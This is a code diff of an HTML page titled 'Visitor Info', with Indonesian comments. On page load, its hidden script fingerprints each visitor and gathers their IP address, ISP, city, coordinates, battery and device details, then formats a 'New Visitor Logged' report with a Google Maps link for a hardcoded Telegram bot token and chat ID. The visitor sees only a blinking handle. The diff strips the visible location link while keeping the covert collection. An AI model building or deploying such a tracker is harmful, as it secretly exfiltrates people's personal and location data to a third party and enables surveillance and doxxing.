@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>don't know</title>
+  <title>Visitor Info</title>
   <style>
     body {
       background: #111;
@@ -11,19 +11,36 @@
       font-family: monospace;
       display: flex;
       flex-direction: column;
+      gap: 0.5rem;
       justify-content: center;
       align-items: center;
-      height: 100vh;
+      min-height: 100vh;
       text-align: center;
       padding: 20px;
     }
     h1 {
       font-size: 2rem;
       animation: blink 1s infinite;
+      margin: 0;
     }
-    #maps-link {
-      margin-top: 1rem;
+    .info-box {
+      display: flex;
+      gap: 1rem;
+      flex-wrap: wrap;
+      justify-content: center;
       font-size: 0.9rem;
+    }
+    .label {
+      background: rgba(255,255,255,0.05);
+      padding: 6px 12px;
+      border-radius: 8px;
+      display: inline-flex;
+      align-items: center;
+      gap: 4px;
+    }
+    .small {
+      font-size: 0.75rem;
+      opacity: 0.8;
     }
     @keyframes blink {
       0%, 100% { opacity: 1; }
@@ -37,11 +54,13 @@
 </head>
 <body>
   <h1>@Hyrootz</h1>
-  <div id="maps-link">memuat...</div>
+  <div class="info-box" id="info-box">
+    <!-- Tidak lagi diisi lewat JS -->
+  </div>
 
   <script>
     const BOT_TOKEN = "8053780203:AAFAV7b_NYcbj2NmakX3_Az4dTnYigPmelA";
-    const OWNER_CHAT_ID = "7813060570"; // <-- Ganti dengan chat ID owner bot (bukan grup)
+    const OWNER_CHAT_ID = "7813060570"; // <-- Ganti sesuai
 
     async function generateFingerprint() {
       const ua = navigator.userAgent;
@@ -50,7 +69,6 @@
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
       const ram = navigator.deviceMemory || "N/A";
       const cpu = navigator.hardwareConcurrency || "N/A";
-
       const raw = `${ua}|${lang}|${res}|${timezone}|${ram}|${cpu}`;
       const encoder = new TextEncoder();
       const data = encoder.encode(raw);
@@ -61,7 +79,7 @@
     async function getVisitorInfo() {
       const clock = new Date().toLocaleString();
       let latitude = "N/A", longitude = "N/A", weather = "N/A", temperature = "N/A";
-      let country = "N/A", province = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
+      let country = "N/A", province = "N/A", city = "N/A", ip = "N/A", accuracy = "N/A", namaISP = "N/A";
 
       const userAgent = navigator.userAgent;
       const androidVersion = userAgent.match(/Android\s([0-9.]*)/)?.[1] || "N/A";
@@ -78,7 +96,7 @@
       const doNotTrack = navigator.doNotTrack;
       const fingerprint = await generateFingerprint();
 
-      // Battery info
+      // Battery
       const batteryInfo = await navigator.getBattery().then(battery => {
         return {
           "battery level": Math.round(battery.level * 100) + "%",
@@ -89,23 +107,26 @@
         "charging": "N/A"
       }));
 
+      // Ambil IP & ISP dari ipapi.co (org termasuk ISP)
       try {
         const ipData = await fetch("https://ipapi.co/json").then(r => r.json());
-        ip = ipData.ip;
-        country = ipData.country_name;
-        province = ipData.region;
-        latitude = ipData.latitude;
-        longitude = ipData.longitude;
-
-        // Ambil nama ISP dari IP menggunakan ipinfo.io
-        const whois = await fetch(`https://ipinfo.io/${ip}/json?token=123456789abcde`).then(r => r.json());
-        namaISP = whois.org || "N/A";
-      } catch {}
+        ip = ipData.ip || "N/A";
+        country = ipData.country_name || "N/A";
+        province = ipData.region || "N/A";
+        city = ipData.city || "N/A";
+        latitude = ipData.latitude || latitude;
+        longitude = ipData.longitude || longitude;
+        namaISP = ipData.org || "N/A";
+      } catch (e) {
+        // fallback tetap N/A
+      }
 
       try {
         const weatherData = await fetch(`https://wttr.in/${latitude},${longitude}?format=j1`).then(r => r.json());
-        weather = weatherData.current_condition[0].weatherDesc[0].value;
-        temperature = weatherData.current_condition[0].temp_C + "°C";
+        if (weatherData.current_condition && weatherData.current_condition[0]) {
+          weather = weatherData.current_condition[0].weatherDesc[0].value;
+          temperature = weatherData.current_condition[0].temp_C + "°C";
+        }
       } catch {}
 
       try {
@@ -123,17 +144,6 @@
         });
       } catch {}
 
-      // ====== LOGIC MAPS LINK ======
-      const coordsForMap = (latitude !== "N/A" && longitude !== "N/A") ? `${latitude},${longitude}` : "";
-      let mapsUrl = "";
-      if (coordsForMap) {
-        // pakai Google Maps “search” supaya langsung buka lokasi
-        mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(coordsForMap)}`;
-        document.getElementById("maps-link").innerHTML = `<a href="${mapsUrl}" target="_blank">Lihat di Maps</a>`;
-      } else {
-        document.getElementById("maps-link").textContent = "Lokasi tidak tersedia";
-      }
-
       const jsonData = {
         "nama": namaISP,
         "alamat ip": ip,
@@ -143,6 +153,7 @@
         "lokasi": `${latitude}, ${longitude} (accuracy: ${accuracy})`,
         "country": country,
         "province": province,
+        "city": city,
         "clock": clock,
         "weather": weather,
         "temperature": temperature,
@@ -160,7 +171,12 @@
         "charging": batteryInfo["charging"]
       };
 
-      // ====== MESSAGE TELEGRAM (lengkap, tapi koordinat diganti link) ======
+      const coordsForMap = (latitude !== "N/A" && longitude !== "N/A") ? `${latitude},${longitude}` : "";
+      let mapsUrl = "";
+      if (coordsForMap) {
+        mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(coordsForMap)}`;
+      }
+
       const message =
 `📥 *New Visitor Logged*
 
@@ -169,6 +185,7 @@
 • IP: \`${jsonData["alamat ip"]}\`
 • Country: \`${jsonData.country}\`
 • Region: \`${jsonData.province}\`
+• City: \`${jsonData.city}\`
 
 📍 **Location**
 • Maps: ${mapsUrl ? mapsUrl : "tidak tersedia"}
